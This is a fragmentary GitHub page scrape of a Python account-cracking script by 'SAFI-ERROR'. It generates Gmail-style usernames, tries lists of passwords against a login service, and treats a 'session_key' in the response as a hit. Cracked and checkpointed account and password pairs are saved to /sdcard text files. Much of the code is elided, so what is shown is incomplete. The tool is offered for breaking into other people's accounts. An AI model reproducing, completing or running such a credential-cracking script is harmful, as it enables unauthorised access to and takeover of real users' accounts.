...
SAFI-ERROR Add files via upload
 1 contributor
...
{uu}  ██   ██ ██   ██  ███ ███ 
\033[1;93m=================================
\033[1;97m Owner  : SAFI-ERROR :/
\033[1;97m GitHub : SAFI-ERROR :/
...
def gmail():     
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.SAFI','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.SAFI','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.SAFI', 'r').read().splitlines()
     ...
     try:
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mSAFI-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/SAFI-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                cpacc.append(acc)
                open('/sdcard/SAFI-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
        ...
        for pword in totalpass:
            ...
            if 'session_key' in response.text:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mSAFI-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/SAFI-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
